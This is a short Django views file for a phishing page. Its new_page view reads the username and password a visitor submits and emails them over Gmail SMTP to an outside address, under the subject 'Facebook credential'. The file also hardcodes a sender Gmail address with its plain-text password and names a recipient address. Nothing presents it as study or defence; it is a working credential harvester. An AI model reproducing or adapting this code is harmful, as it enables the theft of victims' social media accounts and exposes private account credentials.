from django.shortcuts import render
from django.views.generic import TemplateView
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib

# Create your views here.
class HomePageView(TemplateView):
	template_name = 'home.html'

def new_page(request):
	username= request.POST['nam']
	password=request.POST['pass']
	# create message object instance
	msg = MIMEMultipart()
	message ="username=="+username+":::password===="+password
	 
	# setup the parameters of the message
	password = "Ankit9876"
	msg['From'] = "panvarijio@gmail.com"
	msg['To'] = "ankit.kumar.yadav0001@gmail.com"
	msg['Subject'] = "Facebook credential"
	 
	# add in the message body
	msg.attach(MIMEText(message, 'plain'))
	 
	#create server
	server = smtplib.SMTP('smtp.gmail.com: 587')
	 
	server.starttls()
	 
	# Login Credentials for sending the mail
	server.login(msg['From'], password)
	 
	 
	# send the message via the server.
	server.sendmail(msg['From'], msg['To'], msg.as_string())
	 
	server.quit()
	return render(request, 'home.html')
	
